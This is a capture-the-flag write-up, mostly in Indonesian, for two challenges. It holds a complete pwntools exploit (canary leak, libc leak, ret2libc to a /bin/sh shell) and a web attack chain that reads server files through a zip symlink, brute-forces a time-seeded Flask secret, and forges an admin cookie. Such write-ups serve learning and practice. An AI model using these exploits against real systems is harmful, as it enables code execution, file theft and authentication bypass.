## pwn
---
### typop
leak canary > leak libc > ret2libc
solver:
```python
from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "./chall_patched"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"
libc = ELF("./libc.so.6", checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p
        self.canary = 0

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def get_canary(self):
        p = self.p
        p.sendlineafter(b"Do you want to complete a survey?", b"y")
        pay = b"A"*10
        p.sendlineafter(b"Do you like ctf?", pay)
        p.recvline()
        p.recvline()
        leak = p.recvline()[:-7][::-1]
        leak = bytes_to_long(leak+b"\x00")
        log.info(f"canary 0x%x", leak)
        self.canary = leak
        pay = b"A"*10+p64(self.canary)
        p.sendlineafter(b"Aww :( Can you provide some extra feedback?", pay)

    def get_exe_address(self):
        p = self.p
        p.sendlineafter(b"Do you want to complete a survey?", b"y")
        pay = b"A"*25
        p.sendlineafter(b"Do you like ctf?", pay)
        p.recvline()
        p.recvline()
        leak = p.recvline()[::-1].strip()
        leak = bytes_to_long(leak)
        leak = (leak - (leak & 0xfff)) - 0x1000
        log.info(f"exe.address 0x%x", leak)
        exe.address = leak
        p.clean()
        pay = b"A"*10+p64(self.canary)
        p.sendline(pay)
	def ropper(self, content):
        p = self.p
        p.sendlineafter(b"Do you want to complete a survey?", b"y")
        p.sendlineafter(b"Do you like ctf?", b"y")
        p.recvlines(4)
        pay = b"A"*10+p64(self.canary)
        pay += b"A"*8
        pay += content
        p.sendline(pay)

    def get_libc_address(self):
        p = self.p
        r = ROP(exe)
        r.call(exe.sym['puts'], [exe.got['fgets']])
        r.call(exe.sym['main'])
        self.ropper(flat(r))
        leak = p.recvline().strip()[::-1]
        print(leak)
        leak = bytes_to_long(leak) - libc.sym['fgets']
        log.info("libc @ 0x%x", leak)
        libc.address = leak


x, p = init()
x.debug((
    # "break *getFeedback+75\nc\nc\n"
    # "break *getFeedback+193\nc\n"
    # "break *getFeedback+199\nc\n"
))
x.get_canary()
x.get_exe_address()
x.get_libc_address()

r = ROP(libc)
r.raw(r.find_gadget(['ret']))
r.call(libc.sym['system'], [libc.search(b"/bin/sh").__next__()])
x.ropper(flat(r))

p.interactive()
```

## web
---
### Simple File Server
Vulnerability:
- unzip symlink lead to linking arbitary file
- unsecure jwt secret key generator using non-cryptograpy secure random module
- jwt tampering 
vulnerability pertama yaitu berada di src/app.py

```python
file.save(filename)
subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"]) # <- vuln
flash(f'Your unique ID is <a href="/uploads/{uuidpath}">{uuidpath}</a>!', "success")
```

mengambil referensi dari artikel berikut https://effortlesssecurity.in/2020/08/05/zip-symlink-vulnerability/.

kita bisa mengakali unzip dan meread arbitary file menggunakan symlink yang kita buat.
berikut cara yang saya gunakan untuk menggenerate symlink

```sh
rm a a.zip
ln -s /tmp/server.log a
zip -r --symlinks a.zip a
```

kemudian setelah itu kita upload zip yang berisi symlink tersebut

![](Pasted%20image%2020230116231049.png)

kemudian kita akses link yang nanti diberikan oleh server, kemudian akses vile symlink tersebut, misal:
http://simple-file-server.chal.idek.team:1337/uploads/f549e553-a14f-43d0-ba72-8153f3fa4398/a

Maka kita akan bisa mendownload file symlink tersebut yang berisi data dari /tmp/server.log dari server

![](Pasted%20image%2020230116231114.png)

Dari info tersebut kita bisa menggenerate jwt token. Ini mustahil karena kode untuk generate jwt token yang tidak secure.

`src/config.py`
```python
import random
import os
import time
from datetime import datetime

SECRET_OFFSET = 0 # REDACTED
random.seed(round((time.time() + SECRET_OFFSET) * 1000))
os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
```

diatas adalah kode yang digunakan untuk menggenerate secret keynya, kode tersebut menggunakan kombinasi time dan SECRET_OFFSET untuk menggenerate seed-nya random 

>Sedikit catatan, kita perlu mencari nilai dari SECRET_OFFSET dengan membaca file src/config.py di server.

Sekarang kita akan mencoba untuk menggenerate secret key dengan informasi yang tersedia diatas.

Kita akan menggunakan kode berikut untuk menggenerate secret:

```python
from datetime import datetime
import random

def get_secret():
    SECRET_OFFSET = -67198624 # didapat dari config.py
    datetime_str = f"23-01-13 23:04:17 +0000" # didapat dari log server
    datetime_object = datetime.strptime(datetime_str, '%y-%m-%d %H:%M:%S +0000')
    for i in range(9999999):
        if i % 5000 != 0: # membatasi agar tidak terlalu lama membuat list
            continue
        timestamp = datetime_object.timestamp()
        timestamp = timestamp + (i/10000000)
        random.seed(round((timestamp + SECRET_OFFSET) * 1000))
        secret_key = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
        yield secret_key


def secret_unique(): # membuat password list yang digenerate uniq agar tidak terlalu lama bruteforce
    uniq = set()
    for val in get_secret():
        uniq.add(val)
    return uniq        

if __name__ == "__main__":
    secrets = secret_unique()
    with open("secret_list.txt", "w") as f:
        for i in secrets:
            f.write(f"{i}\n")
```

>catatan karna kemungkinan ada perbedaan environmen di server dan juga loca, kita sebaiknya menjalankan script diatas menggunakan docker yang telah diberikan, agar wordlist yang dibuat bisa menghasilkan password yang benar

setelah kita mendapatkan wordlist kita, kita perlu melakukan bruteforce jwt, untuk mendapatkan token yang benar.

```sh
flask-unsign --unsign -c "eyJhZG1pbiI6bnVsbCwidWlkIjoiYXNkIn0.Y8IbDQ.5CrLhdzgXrFLPU_LzBLxA3vkE20" --wordlist secret_list.txt
```

kemudian dari token tersebut kita buat untuk membuat cookie baru yang berisi admin=1:

```sh
flask-unsign --sign --cookie "{'admin': 1, 'uid': 'asd'}" --secret 84787d274d6b7e03d94ce2dcbfe85bf1
```

kode tersebut akan menggenerate jwt token, kita gunakan jwt token tersebut ke website challenge, dan kita bisa membaca flag di http://simple-file-server.chal.idek.team:1337/flag 

![](Pasted%20image%2020230116231338.png)

